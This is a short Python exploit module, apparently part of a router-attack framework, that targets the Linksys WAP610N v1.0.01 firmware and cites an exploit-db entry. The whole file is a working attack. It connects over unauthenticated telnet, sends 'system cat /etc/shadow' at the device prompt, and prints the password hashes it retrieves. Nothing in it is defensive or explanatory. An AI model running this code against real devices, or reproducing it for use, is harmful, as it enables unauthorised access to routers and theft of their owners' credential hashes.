import telnetlib
import util
from ..router_vuln import RouterVuln

__router__ = 'WAP610N v1.0.01'
__vuln__='Unauthenticated File Disclosure'
class DumpFiles(RouterVuln):
	"""Unauthenticated root access over telnet
	   http://www.exploit-db.com/exploits/16149/
	"""
	
	def __init__(self):
		super(DumpFiles,self).__init__()

	def run(self):
		util.Msg('Retrieving shadow...')
		try:
			tn = telnetlib.Telnet(self.ip)
			tn.read_until('Command> ')
			tn.write('system cat /etc/shadow\n')
			data = tn.read_all()
			tn.write('exit\n')
		except Exception, e:
			util.Error("Error: %s"%e)
			return
		print data
